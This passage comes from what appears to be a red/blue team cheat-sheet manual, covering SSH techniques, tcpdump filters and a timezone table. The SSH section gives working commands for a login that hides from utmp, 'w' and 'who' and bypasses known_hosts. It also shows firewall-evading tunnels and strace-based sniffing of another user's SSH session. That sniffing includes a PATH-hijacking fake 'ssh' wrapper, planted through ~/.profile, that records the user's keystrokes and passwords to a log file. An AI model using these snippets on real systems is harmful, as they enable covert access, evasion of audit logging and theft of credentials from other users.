StrictHostKeyChecking=no 
$username@$ssh_ip= 
SSH by auto input 
password 
Almost invisible SSH 
# ssh -o UserKnownHostsFile=/dev/null -T PI:EMAIL "bash -i" 
This will not add your user to the /var/log/utmp file and you won't 
show up in w or who command of logged in users. It will 
bypass .profile and .bash_profile as well. On your client side it 
will stop logging the host name to ~/.ssh/known_hosts. 
SSH tunnel OUT 
We use this all the time to circumvent local firewalls and IP 
filtering: 
$ ssh -g -L31337:1.2.3.4:80 PI:EMAIL 
You or anyone else can now connect to your computer on port 31337 
and get tunneled to 1.2.3.4 port 80 and appear with the source IP 
of 'host.org'. 
SSH tunnel IN 
We use this to give access to a friend to an internal machine that 
is not on the public Internet: 
$ ssh -o ExitOnForwardFailure=yes -g -R31338:192.168.0.5:80 
PI:EMAIL 
Anyone connecting to host.org:31338 will get tunneled to 
192.168.0.5 on port 80 via your computer. 
292 
VPN over SSH 
Tunnel layer 3 network traffic via an established ssh channel. 
Allows perform SYN-scan with nmap and use your tools directly. Need 
root on both sides to create a tun devices. These lines should be 
present in your /etc/ssh/sshd_config file (server-side): 
PermitRootLogin yes 
PermitTunnel yes 
Create a pair of tun devices on client and server: 
ssh username@server -w any:any 
Configuring client-side interface: 
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 
Configuring server-side interface: 
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 
Enable ip forwarding and NAT on the server: 
echo 1 > /proc/sys/net/ipv4/ip_forward 
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE 
Now you can make the peer host 1.1.1.1 your default gateway or 
route a specific host/network through it: 
route add -net 10.0.0.0/16 gw 1.1.1.1 
**This example the serverâ€™s external network interface is eth0 and 
the newly created tun devices on both sides are tun0. 
SSH socks4/5 OUT 
Reverse dynamic forwarding. Tunnel all your browser traffic through 
your server use SOCKS with 127.0.0.1:1080. (OpenSSH 7.6+) 
$ ssh -D 1080 PI:EMAIL 
SSH socks4/5 IN 
Give team members access to your local network or let others use 
your host as an end-point by them configuring host.org:1080 as 
their SOCKS4/5 proxy. 
$ ssh -g -R 1080 PI:EMAIL 
Sniff a user's SSH session 
$ strace -e trace=read -p  2>&1 | while read x; do echo "$x" | 
grep '^read.*= [1-9]$' | cut -f2 -d\"; done 
Non-root sniff a user's SSH session 
If /proc/sys/kernel/yama/ptrace_scope is set to 1 then create a 
wrapper script called 'ssh' that executes strace + ssh to log the 
293 
session. SSH session will be sniffed and logged to ~/.ssh/logs/ the 
next time the user logs into his shell: 
# Add a local path to the PATH variable so our 'ssh' is executed 
instead of the real ssh: 
$ echo '$PATH=~/.local/bin:$PATH' >>~/.profile 
# Create a log directory and our own ssh binary 
$ mkdir -p ~/.local/bin ~/.ssh/logs 
$ cat >~/.local/bin/ssh 
#! /bin/bash 
strace -e trace=read -o '! ~/.local/bin/ssh-log $$' /usr/bin/ssh $@ 
# now press CTRL-d to close the file. 
$ cat ~/.local/bin/ssh-log 
#! /bin/bash 
grep 'read(4' | cut -f2 -d\" | while read -r x; do 
        if [ ${#x} -ne 2 ] && [ ${#x} -ne 1 ]; then continue; fi 
        if [ x"${x}" == "x\\n" ] || [ x"${x}" == "x\\r" ]; then 
                echo "" 
        else 
                echo -n "${x}" 
        fi 
done >~/.ssh/.logs/ssh-log-"${1}"-`date +%s`.txt 
# now press CTRL-d to close the file 
$ chmod 755 ~/.local/bin/ssh ~/.local/bin/ssh-log 
REFERENCE: 
https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet 
https://github.com/dennyzhang/cheatsheet-ssh-A4 
294 
T 
T
T 
TCPDUMP 
RED/BLUE TEAM 
NETWORK TRAFFIC 
LINUX/MacOS 
BASIC SYNTAX 
Match any traffic involving 192.168.1.1 as destination or source 
# tcpdump -i eth1 host 192.168.1.1 
Match particular source only 
# tcpdump -i eth1 src host 192.168.1.1 
Match particular destination only 
# tcpdump -i eth1 dst host 192.168.1.1 
Match any traffic involving port 25 as source or destination 
# tcpdump -i eth1 port 25 
Source port 25 
# tcpdump -i eth1 src port 25 
Destination port 25 
# tcpdump -i eth1 dst port 25 
Network filtering: 
# tcpdump -i eth1 net 192.168 
# tcpdump -i eth1 src net 192.168 
295 
# tcpdump -i eth1 dst net 192.168 
Protocol filtering: 
# tcpdump -i eth1 arp 
# tcpdump -i eth1 ip 
# tcpdump -i eth1 tcp 
# tcpdump -i eth1 udp 
# tcpdump -i eth1 icmp 
Boolean Expressions : 
Negation    : ! or "not" (without the quotes) 
Concatenate : && or "and" 
Alternate   : || or "or"  
Match any TCP traffic on port 80 (web) with 192.168.1.254 or 
192.168.1.200 as destination host 
# tcpdump -i eth1 '((tcp) and (port 80) and ((dst host 
192.168.1.254) or (dst host 192.168.1.200)))' 
Match any ICMP traffic involving the destination with physical/MAC 
address 00:01:02:03:04:05 
# tcpdump -i eth1 '((icmp) and ((ether dst host 
00:01:02:03:04:05)))' 
Match any traffic for the destination network 192.168 except 
destination host 192.168.1.200 
# tcpdump -i eth1 '((tcp) and ((dst net 192.168) and (not dst host 
192.168.1.200)))' 
ADVANCED FILTERING 
Match the IP header has options set. 
In binary 
# tcpdump -i eth1 'ip[0] & 15 > 5' 
In hexadecimal 
# tcpdump -i eth1 'ip[0] & 0xf > 5' 
Match any fragmentation occurring 
# tcpdump -i eth1 'ip[6] = 64' 
Matching the fragments and the last fragments 
# tcpdump -i eth1 '((ip[6:2] > 0) and (not ip[6] = 64))' 
Match traceroute usage on the network 
# tcpdump -i eth1 'ip[8]  600' 
Matching any TCP traffic with a source port > 1024 
# tcpdump -i eth1 'tcp[0:2] > 1024' 
Match packets with only the SYN flag set, the 14th byte would have 
a binary value of 00000010 which equals 2 in decimal. 
# tcpdump -i eth1 'tcp[13] = 2' 
Matching SYN, ACK (00010010 or 18 in decimal) 
# tcpdump -i eth1 'tcp[13] = 18' 
Matching either SYN only or SYN-ACK datagrams 
# tcpdump -i eth1 'tcp[13] & 2 = 2' 
Matching PSH-ACK packets 
# tcpdump -i eth1 'tcp[13] = 24' 
Matching any combination containing FIN  
# tcpdump -i eth1 'tcp[13] & 1 = 1' 
Matching RST flag 
# tcpdump -i eth1 'tcp[13] & 4 = 4' 
Easier way to filter flags 
# tcpdump -i eth1 'tcp[tcpflags] == tcp-ack' 
Matching all packages with TCP-SYN or TCP-FIN set :  
# tcpdump 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0 
Match any packet containing the "MAIL" command from SMTP exchanges. 
# tcpdump -i eth1 '((port 25) and (tcp[20:4] = 0x4d41494c))' 
Match any packets containing GET requests 
# tcpdump -i eth1 'tcp[32:4] = 0x47455420' 
SSH connection (on any port) :  
We will be looking for the reply given by the SSH server. 
OpenSSH usually replies with something like "SSH-2.0-
OpenSSH_3.6.1p2". 
The first 4 bytes (SSH-) have an hex value of 0x5353482D. 
# tcpdump -i eth1 'tcp[(tcp[12]>>2):4] = 0x5353482D' 
If we want to find any connection made to older version of OpenSSH 
(version 1, which are insecure and subject to MITM attacks) :  
297 
The reply from the server would be something like "SSH-1.99.." 
# tcpdump -i eth1 '(tcp[(tcp[12]>>2):4] = 0x5353482D) and 
(tcp[((tcp[12]>>2)+4):2] = 0x312E)' 
Match ICMP messages type 4, are sent in case of congestion on the 
network. 
# tcpdump -i eth1 'icmp[0] = 4' 
REFERENCE: 
https://github.com/SergK/cheatsheat-
tcpdump/blob/master/tcpdump_advanced_filters.txt 
https://github.com/dennyzhang/cheatsheet.dennyzhang.com/tree/master/cheatsh
eet-tcpdump-A4 
http://www.tcpdump.org/tcpdump_man.html 
http://easycalculation.com/hex-converter.php 
http://www.wireshark.org/tools/string-cf.html 
http://www.wireshark.org/lists/wireshark-users/201003/msg00024.html 
T
T 
THREAT INTELLIGENCE 
BLUE TEAM 
MISC 
N/A 
Curated List of Threat Intelligence Sources 
https://github.com/hslatman/awesome-threat-intelligence 
T
T 
TIMEZONES 
ALL 
INFORMATIONAL 
N/A 
COUNTRY/REGION 
TIME ZONE 
OFFSET 
Afghanistan 
Afghanistan ST 
UTC+04:30 
Alaska 
Alaskan ST 
UTC-09:00 
Albania: Tirana 
Central European ST 
UTC+01:00 
Algeria 
Central European ST 
UTC+01:00 
Almaty, Novosibirsk 
N. Central Asia ST 
UTC+06:00 
American Samoa 
Samoa ST 
UTC-11:00 
Andorra 
Romance ST 
UTC+01:00 
Angola 
W. Central Africa ST 
UTC+01:00 
Anguilla 
SA Western ST 
UTC-04:00 
Antarctica 
GMT ST 
UTC 
Antigua and Barbuda 
SA Western ST 
UTC-04:00 
Argentina: Buenos Aires 
Argentina ST 
UTC-03:00 
Armenia 
Caucasus ST 
UTC+04:00 
Aruba, Caracas 
SA Western ST 
UTC-04:00 
Atlantic Time (Canada) 
Atlantic ST 
UTC-04:00 
Australia: Darwin  
AUS Central ST 
UTC+09:30 
298 
Australia: Adelaide 
Cen. Australia ST 
UTC+09:30 
Australia: Brisbane, Coral 
Sea Islands 
E. Australia ST 
UTC+10:00 
Australia: Canberra, 
Melbourne, Sydney 
AUS Eastern ST 
UTC+10:00 
Australia: Perth, Ashmore & 
Cartier Islands 
W. Australia ST 
UTC+08:00 
Austria: Vienna 
W. Europe ST 
UTC+01:00 
Azerbaijan 
Azerbaijan ST 
UTC+04:00 
Azores 
Azores ST 
UTC-01:00 
Bahamas, The 
Eastern ST 
UTC-05:00 
Bahrain, Kuwait, Riyadh, 
Qatar, Saudi Arabia 
Arab ST 
UTC+03:00 
Baku, Tbilisi, Yerevan 
Caucasus ST 
UTC+04:00 
Bangladesh 
Central Asia ST 
UTC+06:00 
Barbados 
SA Western ST 
UTC-04:00 
Belarus 
Further-Eastern ET 
UTC+03:00 
Belgium Brussels 
Romance ST 
UTC+01:00 
Belize 
Central America ST 
UTC-06:00 
Benin 
W. Central Africa ST 
UTC+01:00 
Bermuda 
SA Western ST 
UTC-04:00 
Bhutan 
Central Asia ST 
UTC+06:00 
Bolivia: La Paz 
SA Western ST 
UTC-04:00 
Bosnia and Herzegovina: 
Sarajevo 
Central European ST 
UTC+01:00 
Botswana 
South Africa ST 
UTC+02:00 
Bouvet Island 
W. Central Africa ST 
UTC+01:00 
Brazil: Brasilia 
E. South America ST 
UTC-03:00 
British Indian Ocean 
Territory 
Central Asia ST 
UTC+06:00 
Brunei 
Singapore ST 
UTC+08:00 
Bulgaria: Sofia 
FLE ST 
UTC+02:00 
Burkina Faso 
Greenwich ST 
UTC 
Burundi 
South Africa ST 
UTC+02:00 
Cabo Verde(Cape Verde) 
islands 
Cabo Verde ST 
UTC-01:00 
Cambodia 
SE Asia ST 
UTC+07:00 
Cameroon 
W. Central Africa ST 
UTC+01:00 
Cayman Islands 
SA Pacific ST 
UTC-05:00 
Central African Republic 
W. Central Africa ST 
UTC+01:00 
Central Time (US and Canada) 
Central ST 
UTC-06:00 
Chad 
W. Central Africa ST 
UTC+01:00 
Channel Islands 
GMT ST 
UTC 
Chile: Santiago 
Pacific SA ST 
UTC-04:00 
China: Beijing , Macao SAR, 
Hong Kong SAR 
China ST 
UTC+08:00 
Christmas Island 
SE Asia ST 
UTC+07:00 
Cocos (Keeling) Islands 
SE Asia ST 
UTC+07:00 
Colombia: Bogota, Ecuador: 
Quito 
SA Pacific ST 
UTC-05:00 
299 
Comoros 
E. Africa ST 
UTC+03:00 
Congo 
W. Central Africa ST 
UTC+01:00 
Congo (DRC) 
W. Central Africa ST 
UTC+01:00 
Cook Islands 
Hawaiian ST 
UTC-10:00 
Costa Rica 
Central America ST 
UTC-06:00 
Croatia: Zagreb 
Central European ST 
UTC+01:00 
Cuba 
SA Pacific ST 
UTC-05:00 
Cyprus 
GTB ST 
UTC+02:00 
Czech Republic: Prague 
Central Europe ST 
UTC+01:00 
CÃ´te d'Ivoire 
Greenwich ST 
UTC 
Denmark: Copenhagen 
Romance ST 
UTC+01:00 
Diego Garcia 
Central Asia ST 
UTC+06:00 
Djibouti 
E. Africa ST 
UTC+03:00 
Dominica 
SA Western ST 
UTC-04:00 
Dominican Republic 
SA Western ST 
UTC-04:00 
Eastern Time (US and Canada) 
Eastern ST 
UTC-05:00 
Ecuador 
SA Pacific ST 
UTC-05:00 
Egypt Cairo 
Egypt ST 
UTC+02:00 
Ekaterinburg 
Ekaterinburg ST 
UTC+05:00 
El Salvador 
Central America ST 
UTC-06:00 
Equatorial Guinea 
W. Central Africa ST 
UTC+01:00 
Eritrea 
E. Africa ST 
UTC+03:00 
Estonia: Tallinn 
FLE ST 
UTC+02:00 
Eswatini (formerly Swaziland) 
South Africa ST 
UTC+02:00 
Ethiopia 
E. Africa ST 
UTC+03:00 
Falkland Islands (Islas 
Malvinas) 
Atlantic ST 
UTC-03:00 
Faroe Islands 
GMT ST 
UTC 
Fiji Islands 
Fiji ST 
UTC+12:00 
Finland: Helsinki 
FLE ST 
UTC+02:00 
France: Paris 
Romance ST 
UTC+01:00 
French Guiana 
SA Eastern ST 
UTC-03:00 
French Polynesia 
West Pacific ST 
UTC+10:00 
French Southern and Antarctic 
Lands 
Arabian ST 
UTC+04:00 
Gabon 
W. Central Africa ST 
UTC+01:00 
Gambia, The 
Greenwich ST 
UTC 
Georgia: Tbilisi 
Georgian ST 
UTC+04:00 
Germany: Berlin 
W. Europe ST 
UTC+01:00 
Ghana 
Greenwich ST 
UTC 
Gibraltar 
W. Europe ST 
UTC+01:00 
Greece Athens 
GTB ST 
UTC+02:00 
Greenland 
Greenland ST 
UTC-03:00 
Grenada 
SA Western ST 
UTC-04:00 
Guadeloupe 
SA Western ST 
UTC-04:00 
Guam 
West Pacific ST 
UTC+10:00 
Guantanamo Bay 
Eastern ST 
UTC-05:00 
Guatemala 
Central America ST 
UTC-06:00 
Guernsey 
GMT ST 
UTC 
Guinea 
Greenwich ST 
UTC 
300 
Guinea-Bissau 
Greenwich ST 
UTC 
Guyana: Georgetown 
SA Western ST 
UTC-04:00 
Haiti 
Eastern ST 
UTC-05:00 
Heard Island and McDonald 
Islands 
Arabian ST 
UTC+04:00 
Honduras 
Central America ST 
UTC-06:00 
Howland Island 
Samoa ST 
UTC-11:00 
Hungary: Budapest 
Central Europe ST 
UTC+01:00 
Iceland 
Greenwich ST 
UTC 
India 
India ST 
UTC+05:30 
Indonesia: Jakarta 
SE Asia ST 
UTC+07:00 
International Date Line West, 
Baker Island 
Dateline ST 
UTC-12:00 
Iran 
Iran ST 
UTC+03:30 
Iraq 
Arabic ST 
UTC+03:00 
Ireland: Dublin 
GMT ST 
UTC 
Isle of Man 
GMT ST 
UTC 
Israel 
Israel ST 
UTC+02:00 
Italy: Rome 
W. Europe ST 
UTC+01:00 
Jamaica 
SA Pacific ST 
UTC-05:00 
Jan Mayen 
W. Europe ST 
UTC+01:00 
Japan: Osaka, Sapporo, Tokyo 
Tokyo ST 
UTC+09:00 
Jarvis Island 
Samoa ST 
UTC-11:00 
Jersey 
GMT ST 
UTC 
Johnston Atoll 
Samoa ST 
UTC-11:00 
Jordan 
Jordan ST 
UTC+02:00 
Kazakhstan 
Central Asia ST 
UTC+06:00 
Kenya 
E. Africa ST 
UTC+03:00 
Kingman Reef 
Samoa ST 
UTC-11:00 